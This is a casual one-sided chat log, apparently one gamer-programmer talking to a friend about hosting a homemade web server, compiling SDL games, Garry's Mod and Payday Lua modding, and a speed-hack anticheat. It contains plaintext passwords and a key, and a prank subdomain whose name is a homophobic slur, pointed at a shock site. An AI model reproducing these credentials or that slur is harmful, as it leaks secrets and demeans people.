yes
inb4 reddit
no but im going to bed
so good luck finding out
havent switched yet
just go to windows update
and select windows 10
are you on 8.1
oh idk then
https://www.reddit.com/r/pcmasterrace/comments/3f10k0/things_to_removedisable_in_windows_10/
I havent played csgo in like 3 weeks
I havent seen that in the real game
but yeah it looks like it could be
none
you have played gmod what
the airboats
the offroads
all the driver seats are func vehicle
because I never run programs I dont trust
yeah it wasnt
you dont have to run anything you download rain
xcf
is all I ever use
I dont even know what is does
just tar -xcf
oh and j to make bzip2
no
no
what is it
nice
http://puu.sh/jzqo0/c2e43af94a.png
it was ok
it crashed my computer
which was cool
yes
1$
okay it says it will take up to 48 hours to change
http://rain.john2143.com
all yours
put a webserver there on port 80
and just wait I guess
yeah sure give 300$ and its all yours
unless you want a self signed one then just give me it
may good bones and calcium come
yeah you know I wrote my own webserver
https://github.com/John2143658709/john2143.com
download it
change const.js
removed pages/
remove*
and remove .git
or branch it
/fork it
because I want it to use very little memory
thanks
it caches the pages
and restarts the server every so often
to mimic the use that people give it
a push server
like devup.me
but I never did it
mainly because I didnt want to use sharex
idk
didnt care to switch
http://john2143.com/p/8080
nice
goes to a port
just sends like a 302 or something i dont remember
bootstrap
angular
jquery
3 main ones I know about
bootstrap is more mobile oriented
angular is really good
jquery is more oriented to pages that get modified later
but not rewritten
depends on what you want
basic coding classed
learned lua through computercraft in mineccraft
learned javascript adn html
and then java
then read a bunch of books on computers
and operating systems
and learned C and C++
and now Im here
yeah I will probably
yes I wil 100%
my uncle is head of technology for discovery
so I'll prorbaly work there
CTO or something

starter pistols
mfw
yeah he lived with us for like 12 years
idk
have you seen him
nice
he looks like the average linux poweruser sysadmin
yeah
never shaved it
ever
no
like gandalf beard
last thing he said he was doing was working with the software devs to make a movie for shark week that would be viewable from an oculus rift
so he came to my house and demod it for me
oculus rifts are pretty cool
what do you mean
http://john2143.com/bouldercult
what
how would it get me banned from push
puush
as long as its all the same puush link it wont bother to reload it each time
?
vim with plugins
thats what I use
you can use intellij or eclipse or visual studio
or even notepad ++ with plugins
did you edit config.js
no
192.168.1.2 and 80 are mine
ipconfig ipv4
and then port forward port 80 to your computer
or well
first off
set the ip to 127.0.0.1
and try to access http://locahost
what error now
well EADDRNOTAVAIL means it cant bind port 80 on that address
so turn off whatever webserver is on
https://www.iis.net/
nice
type services.msc
into start
world wide publishing
why would I know
yeah doesnt it make your computer a file server or whatever
well
try running the server now
dammit rain you've made we want to learn angular
what is in that folder now
I guess so
Im pretty sure its from the add features thing
if you were wondering
nice
theres so menu
to add features to windows
yeah
that
rip
http://rain.john2143.com/
add an html page there
in the pages folder
like what
good old breifcase of files
thanks windows
I dont even remember how it wokred
no they removed it in 7 didnt they
well it says 2 way
so mabye
mabye not
this implies it works with things that arent always on
liek flash drives that will just auto sync when you plug them in
jon
only the pages/
main.js is meant for static redirects
okay
pages/ is where you put whatever.html
and then you go to http://rain.john2143.com/whatever
and you get the thing
main.js can have dynamic things along with static redirects
anyway
you get 3 arguments for functions
the server object
the result object thing
and then the path
no thats why all my pages use imgur
like i said I wrote this for me
not really
what
inline
<style>
https://developers.google.com/speed/libraries/?hl=en
https://cdnjs.com/
nginx
uhhh
apache loads files as they're requested
so more disk time
nginx loads them into ram
so no dynamic pages
oh also apache has htaccess
which is cool
you have a main file for it
you just cant do directory level stuff easily iirc
idk rain
if you want to do php then do apache
otherwise use nginx I guess
yeah but its still one of the few good server side dynamic languages
the other option is node for dynamic pages
the options for serverside are either php or asp
unless you want to use something that makes it native
like node or ruby on rails
I think nginx might support jsp mabye
iunno you can google it
http://nginx.org/en/docs/windows.html
then its pretty simple
its acutally a really good system but nobody uses rss readers so it sucks
wasnt twitter originally an rss reader that wanted to be able to self publish stuff
is twitter dumb
because thats what it is now
basically yeah
sort of
what
mfw that was the least favorite of mine when I saw it
at least as a full framework
mabye angular + topcoat
...yes
nice
some framworks that do full overhauls like bootstrap can be weird with angular
I mean
its the reason angular is like ng-wrapper-main
and topcoat has topcoat-text-input
and stuff
but boostrap has stuff like span4 and stuff
which is kinda generic
okay ]
you know like basic html right
to do angular stuff you do something like <div class="ng-wrapper">
and the ng-wrapper is what changes it to be angluarly modified
so you can still do default html stuff
and can cross frameworks
but bootstrap iirc has stuff like <span class="span4"> which doesnt exactuly say where its from
so it can make your code messy when you cross stuff
and add your own custom stype
style
beacuse you then have stuff like <input type=text class="topcoat-text-imput span4 mycoolclass what is going on help">
dont cross the beams or you become bad at computer
you get confused and die
What

nice wording
from valve
all the NA dota servers are down
8:32 PM - Rumble/Boulder: and keep him there
voice_enable 0
block
no
rain why
:L
wowl
letsgo
do it
wow
crazy
no
we
are
go
come
onm
hello
ficks
dicks
nein
how much will you have left
lol123
how about I give you 5$
rain pls
like 600$ right now why
i could be a lot of things
me too thanks
yeah what is that about
where are you going
ok
yes
wgat
do you know him irl
is that why you're rain and snow
is there like hail and fog that I dont know about
rain pls
why so many grills
so what is the point of the trip
you said it was for first generation canadians
but its not like they're trying to keep you in canada
so why
Canada’s birthday
\o/
just strange that they are trying to celebrate the birthday of a country
>implying people celebrate
mabye not
also
"go shopping at the Rideau Centre"
why
thats just a normal mall right
oh
yeah how do i give you money
I dont know rain
cant I just give you what you want
and you give me items or something
well its not tradeable for 7 days if I buy it
so i guess you could give me like a 2.50$ skin
and i'll give you it in 7 days
gotta get those monster summer sale cards
717
wow.
its just a white circle
yeah the 600+ have cool flag looking things
227,465
mfw
also
you should probably wait
until the last day of the sale
oh
I thought it was for another week
time to go buy games
why not
okay I baught games
we did it rain
hmm
that may just be because of the sale
yeah it gives them a redeeming link
ez game
how many rounds
wow
thats actually crazy
because your elo is messed up because you play with us]
remember that game I solo queued for
where it was supremes
okay
it was my team of 2 lems 2 supremes
yeah
dont worry
yeah
you have to wait like 10 minutes
for replays to work
I was 3rd
\o/
game balance
what even is this
because blender does particle rendering already
it can be but its meant for way more complex things
https://youtu.be/ckkPiVZ3Lys?t=68
well thats not really possible for any large things
you generally simulate in realtime and then can render in 1-10 hours
you can tell from stuff like the env cloth large thing that they are really cutting corners with rendering
most domain hosters have the ability to just use their whois
but this should be a thing
but only for personal stuff
its still important to see where sites are hosted
and who by
http://puu.sh/iDQKt/bdaea51f32.png
no
hmm
1and1 shouldnt be providing that stuff
zzzzzzz
rain pls
sit down
dont be a dick
done
dont be obese
and you can get by no problems
also download some movies or something on your phone
buy one
also mfw lost in canada
rain pls
theres nothing to worry about then
yeah sure go nuts
no because nothing happens
airports are more interesting
crazy people
kids
angry people
its liretally so common theres no chance you wont see it
obvously I use airports like dulles
which is one of the largest in the world
so idk
but if you're going to ontario or whatever
thers gonna be a lot of people there
just dont bring more than carry on
if you can help it
rain are you sure
you cant help it
rain what could you possibly need thats more than carryon
how long will you be there
you can probably get by on 4 sets of clothes
but if you have like 2 bags
thats easily 6
just dont pack any denim
and you can get a lot of chlothes
bag return is iffy
it can take a few hours

screenshot?
is it the 502 error pls contact devolopers error?
do you have page source?
google doesnt use flash
check your extensions
guide aloe vera
what
yes but only xp
why
I just opened it on my real computer
whats up
http://Aloe-Vera-fr.com
trying to figure out what webserver they're using
because any link on any subdomain is a blank page
instead of a 404 or 50x
which could be tricking google into thinking thats a real page on the site
same link each time?
so does this happen when you search
or one of the google redirect links
my best guess is that the html processor is receive raw assembly from a non code source
which would be a pretty big exploit in chrome
but it would explain the random elements and links and newlines
and obvoisly the text
but mabye its on googles end
yeah google pads their html with a lot of things to make it compatible
so I guess its in googles end
everything on aloevera gave me 200
weird
no idea
tinybuttlogcut
we made it to level 7
8
????
rain
its semimodular
what do you need
sata power is extended from the sata cables on the drives
I think I sent another sata cable with the thing
for use in the extra connectors
no
no
pls dont
so what do you have
a sata cable
or what
like
6pin to sata power
thats 6pin to molex
unless you need molex power you dont need that
no its possible
I just dont know what you have
http://images17.newegg.com/is/image/newegg/12-400-106-TS?$S300$ ?
yeah
you need more of the one
I posted
just
tell me what you have
well you obviously have at least one
hard drives use the same power as dvd
sata power =/= sata dable
data
cable
asdfasefase
you can do 6pin => molex => sata
if you have that
okay
so the second one is sata data
those go to your motherboard
where drives plug in
panic
rain
do you have that recording
of when everyone called my house
because they got my phone number
wayyyy back
when I was manager
we all got on rugs server
and prank called
and people called my house
rain pls
what
okay putting up http://rainisafaggot.john2143.com
pointing it to http://meatspin.com
cool
do it
unless it downscales it then do it
yeah the difference between 60 to 75 is equal to about 75 to 120
nothing
Yeah I need a 144hz montior
and anew mouse
help
I canjt evne play that game
because I can just get a 144 one
rain life is just harder for you I guess
I woudlnt know
mabye if I dated asian girls
but no rain
no experience
how about eagle to global
yeah but not really
until I get my new mouse
not playing competitive until I have a mouse
the sensor went bad
so Im gettinga new one
like a year
mabye
didnt try
What about I'm afk
rain what
wanna cs
ok
thats a yes
right
yes
I dont think it was them
I think it was an exploit
I ahve an idea of how it was done
yes
mfw I was right
yes
Wanna play csgo
what stream
what is he doing
rain
do you have anything to ssh with
can you login to rain@john2143.com
exactly what I put
password test
ok cool it works
what do you mean
I was just testing to see if I could ssh tunnel
do tmux a
can yoi
see steuff
I guess we both cant attach to the same session
nice
hey
I have this port forwarded
so I can access this anyway
anywhere
I mean
then
I can ssh into stuff on my network
through this
how about now
tmux ls shows 1
reattach
to the session
I mostly just use that to compile stuff
and run http://john2143.com
so now its also an ssh tunnel
its so when I am up from your computer
my
I can access it
sure
is it today?
cool
I'll go look
rain
you do
ye?
cs.
oklay!
what a player
yes
Why am I being pokes
I can't see
no
it doesnt have the gl headers
and library
http://puu.sh/kyEhL/228841be8e.png
idk yet
how about a more teambased
faster paced
realm
'area governed by the disgruntled diety'
yes
idk
I'm gonna write the backend in lua I think
or python
But I dont know much python
why
what
well I mean
you can do that anway
nobody has
I guess thats pretty common
its just a weird feeling
to code something so bad
but remember our plan
"Dont release the bad ones"
yeah
it has that example file
with some slightly more annoying ones than rosepoco
https://github.com/John2143658709/Test-Game
what do you think
?
yeah what
well windows sucks
and doesnt have a clock() function
well it does
but it measures it in ms
not nano seconds
because ms isnt precise enough
game developers
what
you can either have 58 fps or like 65 with ms
it isnt accurate
how do you get the time for the frame then
ok
nice
I mean
the original game
was 30 lines
50% of this code
is for the timer
yeah basically
There's no floats what
Help
csgop
yes
porbably more than one
why
why
ping 8.8.8.8
change your dns
ye
I dont have it either
but I have the toolings
what
I use mingw
I have all the stuff setup though
to compile visual studio
ok
ok
I have to write my own compile thing
http://i.imgur.com/GfzgSvm.png :(
http://i.imgur.com/cEfmqmi.png
hello
what
no
we cant just copy braid
nicememe
what do you have the date in
unix time?
so what do you want
seconds from the hour?
the general way you do it
if you have seconds from day start would be
i mean
it depends
on how your caluclations works
work
it it worth ito
to round up
err
round off
and multiply up
var secondsFromDay = 0; //...
division is all integer division
as in
it rounds down
no floating points
i saw
yte
no
wtf
they must have really shitty practices
literally just roleback
to first working patch
then look at diffs
how old
idk
check steam
screenshots
loan
loaned keys
no
I mean
yes
but the scrollbar
mabye I got double back
idk
0 arkam
no problems
karma
yes
jeez rain
calm down
mineacr is hard
minecraft
buit anyway
are you asking balance wise
or code wise
I mean
obviously balance wise
just straight copying it
its way too strong
so idk
divide damage by 4?
remember
i mean
theres servers that have all the guns
what do you mean realistic
not that I know of no
i did it before
I just never added it
basically on swep fire
ye
you have to do your own ray calculations
no but I can tell you how
I mean
I did it right after I finished calc 1
so I was good at trig
its just a lot of math
do you know how vector multiplication works
ok look
you have the recoil table
you multiply the vectors
and normalize them
so (ply:AimVector() * recoiltable[currentShot]):normalize()
i mean
thats the code
the rest is just balance
yes
writing them was the hard part
I wrote a thing
to record where I shot
on a wall
and I just copied it
like
I tried to shoot like the recoil
as close as I can
its like 40 lines
I did it in one afternoon
I was gonna ask if you remember me porting css guins
did i?
oh yeah
Im proud of that
again
40 lines
I guess
coding has gotten a lot easier as I got older I guess
idk
it has smoke
yeah the smokes were shitty
?
huh
oh
you want a key and stuff
1Xr14iu0G3GAUeDySbxnD8o9O10mVUmT
thats your key
http://john2143.com/uf

basically
thats hot
I wish minecraft didnt use java
are you kittins me
c is easier to mod than java
even teamspeak has mods
plugins
its not like they did for java
no
its doable though
if it was c++
we would probably have another shootmania trackmania type deal
game is closed source
community wants mods
community makes its own game
with mods
ends up better
not everything ends up good
yes
I dont really know what was going on
back in my day we did that by hand
i dont think anyone has died soldering
> not even decoding binary by hand
yeah me irl
i mean
I dont know what they are'
im on mineaccr
not with emily
shes in bed
how do I even
uhh
help
it wont play in brower
browser
its fine
I guess
ok
look

when its fullscreen
but not windowed for some reaosn
probably because I have one monitor thats 60hz
idk
mouse cursor is always fine though
its weird
why
no

yes
what do I make this game do
dota
no
csgo
happening
who
hot
http://john2143.com/f/Zth3X
what
that man is vacced
yes
in
are you come
why
I will when we play
you're our fifth
uhh
it's pretty easy
you know the test game repository I have
on my github
get the SDL library's and stuff from there
and then download SDL ttf
yeah
mine has that
include/sdl
do you have mingw and c make and studd
mabye?
try it
you'll need the libraries though like 100%
https://github.com/John2143658709/Test-Game/tree/master/include/SDL2
rename sdl2 to sdl
or mabye you need sdl 1
I wouldn't know
add -Iinclude/sdl2
to compile options
mabye
or sdl1
what
when a file defines a header that already exists
what are you doing
what
uhh
thats not a thing
you should need to do
ok
does it work
weird
you're running make right
make should already do that
I'm sure itll run g++ -lSDL
stop using emoji
mingw headers
theres a lot of stuff to make the kernel calls work
sound delay is probably just from bad code
yeah I was gonna say that
that wold have been compiled with cc
not gcc
[prbab;y
probably
install visual studio
?
what
why did it make you sad
mingw-get
??
http://john2143.com/f/VFSxh
http://john2143.com/f/YTzox
?
master header probably
it probably cant andle defines
so it runs the preprocesser
as part of automake
yes
you use the command line the same way
I have no idea
I've never tried to compile i
no
its what I use
sdl provides binaries for windows
https://www.libsdl.org/download-2.0.php
http://john2143.com/f/F3Rdw
yeah alright
you get the runtime libraries and link them
is there a sdl3
of
oh
https://www.libsdl.org/download-1.2.php
uhh
sdl isnt a graphics library
or that
yes
I mean
you use opengl calls
to do rendering
rain I did
test game is a game engine
its a lua game engine
I mean
it uses sdl
simple direct media layer
right
hello
time to rename test-game
smart direct engine layman game looker
yes rain
sdlgl is an anime game
not and anime game engine
its just an anime game
about an anime girl
with anime boobs
woahhh robots
get out of here rain
idk
I've never used it
I have cc installed
but idk
no
you install visual studio
then you run a bat file
that adds cc and stuff to your path
I dont think so
beacuse you have tot keep vs installedf
run C:\Program Files\Microsoft Visual Studio 9.0\VC\vcvarsall.bat
or whatever version
on startup
of console
that is
for every console
that starts
also its cl
nowq
http://stackoverflow.com/questions/84404/using-visual-studios-cl-from-a-normal-command-line

proove ittttt
one of them ignores the headers

ollydbg is for debugging programs
more than hxd which is for just data
hxd shoudl read everything\
iunno
how big is the file
some guy uploaded a .lnk

go ahread and run that
some guy on http://freelancer.com
idk
http://john2143.com/f/SsesN
dont open the zip inside the zip
for obvious reasons
its not really hard to remove
it looked like a rat
all I know it did for sure
was send pictures
over a port
to a server somewhere
yeah idk
I tried to get a hostname or something too
http://john2143.com/f/NNGB6
I think its an issue with explorer properties

well
cool
is it fun
arrow keys mabye
wasd
esdf
try

http://john2143.com/f/U7dU7
it it set to ignore the lua directory or something
http://john2143.com/f/0TR0X

http://john2143.com/f/cu-wF
hey should I made the urls base 62
or keep the -

one of the binaries probably doesnt work
yes
http://john2143.com/f/Frqa7
I dont know why thats happening
here have an exe
http://john2143.com/f/pObks
I'll sign it if you want
but not really
follow camera
arin
come
right now mister
sir
no
come
pls
what
what do you want
be specific
hello
whats up
what
thats the last thing I want rain
unless you want to play smash
This is http://Freelancer.com Support.
I responded
nothing  back
they froze my account
I took them off my bank
so
yeah no thanks
get a job after emily and I's vacation
june
ok
no
no
if you want
ocean city
nice
I mean
vice city is miami
so
why
sure
tfw updated
ye
I just got back
to my computer
ok
can I get an interactive console
if I had access to loadfile and loadstring sure
:/
char str[9999]; while((*str++ = _getch()) != '\n'); lua_loadstring(str);
submit a pull request
something like it
char strbase[9999]; char *str = strbase; while((*str++ = _getch()) != '\n'); *str = '\0'; lua_loadstring(strbase);
no backspace
but the otherone didnt have it anyway
?
whatever the c console function is
require just straight up crashes the game
fun times
runs another file
the solution was pretty simple
but I used require a lot
so its jkust awawkrd
we're doing it boys
http://john2143.com/f/mX7TR
ask your doctor
I havent played a game
but I got it working in like 20 minutes
so thats nice
I had to write a whole new log function
because theirs crashes the game if it fails
jhud.log = function(...)
concat dies if not everything is a string
and their log only takes one parameter
if it dies there
for whatever reasson
then the game crashes
instaantly
http://john2143.com/f/5hA9X
http://john2143.com/f/jTwml
yes
espacio
rain
arin
so not
coming
why
its hard now
they broke the vault
so that it alerts people way faster
and while its opening and closing
loud or quite
what
they changed the system
don ac dum
also update johnhud
because autoupdator
you have to type /update apply
github dev branch
its configurable
look in jhopts for the options
mabye
I need to finish this update for johnhud
networked suspicion code
to show the pcts
yes
like when you're host
http://john2143.com/f/j2PnO
you died
where
rain how
rain
do you know anything
about HP
in payday

"Anyone who is less than 14 should never have any position in devolved" ~Jackool
Thats pretty close to the exact quote
When he demoted fakie
Slayed people who killed him
randomly demoted and promoted people

Hacked the rcon and made himself superadmin
Thouhg I think mythik just gave him the pass without knowing what it did and doesn't wanna say

Kitten wants to demote you
So while I may be demoting some beloved community members it isn't because I dislike them. In fact it's quite the opposite I like them enough to relinquish their power so they can log on and just have fun again. Thereby alleviating that pressure of feeling like they need to log on as if
I just told him not to

you can probably add it to unusals if you do item 8 6 strangekills//#0
"Times blinked"
what do you mean
just need to write the meta functions
and ez
hi
what
do you mean
how to set the animations
on a swep
I'll get the ttt value
one sec
SWEP.PrimaryAnim = ACT_VM_PRIMARYATTACK
make sure those are set
get the ACT_VMs off the wiki
http://wiki.garrysmod.com/page/Enums/ACT
eh
...that should make you happy
things look weird when you can see the bones' positions
go in sandbox
use the bone changer tool
uwot
yes
what about that
idk how zs code works
its claled by zs
yeah
its probably what calls the VElements
what does it do
exactly
lol
make SWEP.ShowViewModel = false
http://puu.sh/9BFYk/eed353c8a1.jpg
pls dont make a pug
pun
Strange part "Teammate kills"?
oh boy
here comes the rdm because you wanted the kill count
then again
poeple may also want to keep that really
low
so
I could make it secretly always count the teammate kills
and only show when the strange part is active
SWEP.fingerprints = {}
in the init
if you
want
mhm
yes
it returns a player object
what object thing exactly
wait
you want to make the manhack scanable
okay
one sec
http://puu.sh/9BHnd/7c1ce62f82.png
it should /always/ play dna_notfound unless its not a valid entity
> then its not a valid entity
wait
do you have fingerprints set to {}
in the manhack
in the primary fire
yeah
wait
yeah okay
in the thing that spawns it
when you do
ents.create
take that ent
and set its fingerprints to {self.Owner}
and make sure thats in the deploy thing
and not the manhack initialize
it isnt redeployable right
oh also
make sure thats in a if SERVER bracket
if SERVER then manhack_ent.fingerprints = {self.Owner} end
open up your weapon_ttt_wtester.lua
in the terrortown/entities/weapons
okey?
line 113
print(ent)
and if you're real edgy
line 100: print(ent and ent == NULL)
to do a null check
ie manhack got deactivated or somethign
PrintTable(ent.fingerprints)
after the first print you added
yeah okay
lemme look at the safedrop code
from baseweapons
nice!
Pristine!
no no wait
lets do this
one last attempt
at glory
set a local variable owner
or something
a local variable
pls rain
literally line one
type local curSwepOwner
okay
now in SWEP:Equip
does it exist
the manhack one
is there a SWEP:Equip() function
okay
good stuff then
in your manhack
do
alright
Im thinking rain
okay
I think this might work
function SWEP:Equip(owner)
function SWEP:Equip(owner)
http://puu.sh/9BIIt/441bc32b6a.png
I mean if its erroring
then just add
SWEP.Anim_initialize = function() return false end
why delete turret
does this new thing have ti?
fancy
"name""yes"
local ent = ents.Create( "env_explosion" )
SWEP.Icon = "VGUI/ttt/icon_manheckler"
purple black icon
pls help
yes
okay actually rpg_missle could be the rocket entity
there should be blood splatter everywhere when it hits something
function SWEP:SecondaryAttack()
ents.Create
rights
right
do you ever change the value for ents
make sure
and I hope you dont ever use a table called _G or _R
Because you can use them
d
I dont beleive you know how though
local spawnpos = turret:GetPos() + turret:GetAngles():Forward()*100
vector1 + Vector(0,0,z)
why reload
http://puu.sh/9BQCQ/c8a53a11c9.png
kek
what
that code?
try it out
lol
??
it should force whatever you want itto dl
http://puu.sh/9Cyt0/d94f7c6160.zip
rain can you come on and test the death messages
?
ok
well
that might work
actually
change it back
and make ent:Fire
into
ent:Fire("Explode", 0, .1
)
to my computer?
lol
I would honestly give you that
if I knew how
well Im assuming I could make it only a specific directoru
why would I zip it
passwords.rtf all the way
welp
filezilla server doesntw ork
and neither does the wikihow
http://puu.sh/9CHpm/6e743d5e6b.png
get on
:c
ok
I have like 30 min
do I just connect to that ftp
with any client
because I told you yesterday
I was having a party
movies
wait where
I have this
http://puu.sh/9EAcQ/8df0f58f7d.png
http://puu.sh/9EAe0/31aeb15e59.png
http://puu.sh/9EAg4/445b6cb61c.png
???
done now what
just change the .vtf to vmt
in the addfile
http://puu.sh/9EAzs/1b1232f0fe.png
yeah still not working
well can you help me still
Like
what do I resource.addfile
the vtf or the vmt
well idk how to fix this
I dont wnat it to be lightmappedgeneric
I know that for sure
but idk what the shader that replace black with transparency is called
oh
lol.
didnt work
rip
J7vkhN87NB pls dont break stuff
no
what do you mean
lol
http://puu.sh/9FCyq/5ba4fe76f0.jpg
trade testing?
ples rin
trade chat edge
addCommand("slay",function(ply, args, silent)
what timer and how is it erroring
is it a server timer or a client timer
also
rain pls
well timers dont just randomly error rain
/why/ is it erroring
if self.Owner then /*do the emit*/ end
wait actually
what is self.Weaopon
lol
Weapon
is that the SWEP or something?
why not just self:EmitSound()
rain
stuff wont work
?
the world outside swep and sent scripting is completely different
what are you trying to do
iunno
theres no documentation
probably just do function SWEP:PreDrawViewModel(vm) vm:RotateAroundAxis(Angle(0,0,1),40) end
try that
see if it does anything
actually that Angle(0,0,1) should be Vector(0,0,1)
so Im coding an anticheat
and I dont know if I want to autoban for speedhacking
well how it works atm is
if you're moving above a certin speed
it resets your speed
and flags you as going fast
and if you, in the next tick, immedieatly after
are moving 100 units faster than the cap, and are flagged
then you get autobanned
so bhop would be allowed and capped
without bans
but if you force your speed
for 1 second straight
then it bans
theres also stuff like authkeys that have to be sent every few seconds
or you get flagged as messing with interp and stuff
I dont see how that wall works
like
does it force your client to take a screenshot and upload to server?
looking at these
I see what he's doing
he replaces the lua_openscript_cl autocomplete function
witha  function that screenshots
lol
can you give me a list of cheaty commands
like sv_cheats
and sv_allowcs_lua
hey rain can you unban me
!banlist > remove ban
Im gonna jack devolved's fastdl
holy shit I just realized I made a horrible pun
pls dont hurt me
are you gonna balance your guns or should I do that while I add stat tracks
okay
you know about the new values right
SWEP.MovementPenalty = 0.03
reset time is the time it takes for the guns crosshairs to recenter
cone is the cone at full spray
movementpenalty is added to the cone when moving at full speed
I'll zip the base weapons
http://puu.sh/9IU95/ac716c20b5.zip
no
Disconnect: Banned permanantly for reason t..
pls unbun

wat
arent you tidlerain on github
tfw parents think im a hacker because this http://puu.sh/eWedz/6c5b4df674.png
what
vim is the most versatile text editor that exists
so yes
on the left
is my vimrc
colo desert
is the color mode I have
syntax enable turns it on
and then I have a lua syntax script downloade
significantly faster to code in
but I dont use the find in files functions
which is why I have notepad
well iunno rain
you can turn that 10%
into a 3%
if you use vim
just like download vim
and then ask me for a key combo
and eventually you'll be good
like
A is move to end of the line and enter insert mode
o is insert line below and enter insert
ea is move to end of word and enter insert
99% of what I use
thats not macros
hjkl is eh imo
yes
vram boys
tfw I dont care
tfw you wont accept my 670
yolo
inb4 you dont have enough pci lanes

http://puu.sh/fu2Z7/eb58ff1741.png
you mean tf2 in a nutshell
rain pls learn lua nd hlep me
how about i just get the code from tfw

and convert it to lua
http://puu.sh/fu365/254294cc10.png
it does
?
http://puu.sh/fWagn/7820e9bd53.png
global variables arent persistant
so gsm:update may get unloaded because it isnt used

scrnshot
hmm
delete the update folder
in the johnhud directory
no
right so
its deleteed right
therse no update folder
run /update -d
and see if the version file is updated
hmm
one sec
okay do a manual update
from johnhud/dev
ready up
ez
join
yes
no
mabye
I dont think so
make sure payday has access to write to the symlinked folder
idk if it does by default
open up a command prompt in the payday symlink folder
and run curl google.com > google.html
well try what i just put
okay do it in the dev folder
?
RAIN
WHERE IS JOHNHUD
GO THERE
RUN CURL
curl https://www.google.com/?gws_rd=ssl > google.html
open google.html
cool
so that works
you should get a curl log in your payday console
http://puu.sh/ga8hb/bd50edda36.png
when doing /update -d -f
well therse the issue
so the question is
who
why
what
when
how
rain
why
how about you definitly have thw right version
the only issue is that payday doesnt work
so
go to payday console
okay
_(os.execute("curl https://www.google.com -k"))
it prints out googles stuff
no
tfw it worked
viruses
okay
okay.
rain
I want you to know
if this becomes a big deal
the hud that is
then people will
because people will see how
i'll just encrypt it if its that bad
ripalpapi
good
a return status of 0 for echo means no error
http://www.computerhope.com/xdoseror.htm
not really
but join me on a working hook
so i can test this update
a
run /update
then go to modules/autoupdate.lua
does /update crash you or something
no
look at the file
and see if it changed
just open autoupdate
and read line 49
to me
hooray it works
idk how hoxhud works
okay
can you join again
and then we do a heist loop thing
and mabye it works
rip
join and /version
!?
actually
autoupdate.lua
line 50
is it self:createVerFile()
or end
yeah then it works
cool
update?

theres a secret society of people who know the lua source in and out on reddit
ok
is it stealth now
as in'
the last thing send
ok
what do you mean
oh
yeah its not hard
i'll make a quick test script
ok
i may just make a function to scan for a varible
in the whole of the code
restart
nice
rip drivers
riperino
ded?
run Global.game_settings.difficulty = "easy"
and restart
the hesiut
nicer
http://puu.sh/gaiTe/2f56b42386.png

do e
t'
collectgarbage()
I dont wanna use stamina bar
and also thinking about writing an alert system type thing
im gonna leave in the text option thing
and gonna make a custom bar
its not that hard
probably just on the left
yeah
planning to
but I cant find time remaining
?
no inspire builds
ayy lmao
github
find me a better smoothing function
you know like
basic functions
from math right
y = x^2 or whatever
okay
do you know basic calculus
ie how to integrate
if not you can probably just google it anyway
or ask wolframalpha
but basically
you want a velocity function
like y = sqrt(1-x^2)
where its fast and then gets slower
and then you integrate it
and thats the position function
so yeah
heres that
which I was thinking of using
http://puu.sh/gRqgD/4f41bc9ab9.png
and heres what I ended up using
which is a bit drastic
http://puu.sh/gRqmC/421cc84b59.png
it updates as soon as it does in the code itsself
like ~ every .5 seconds
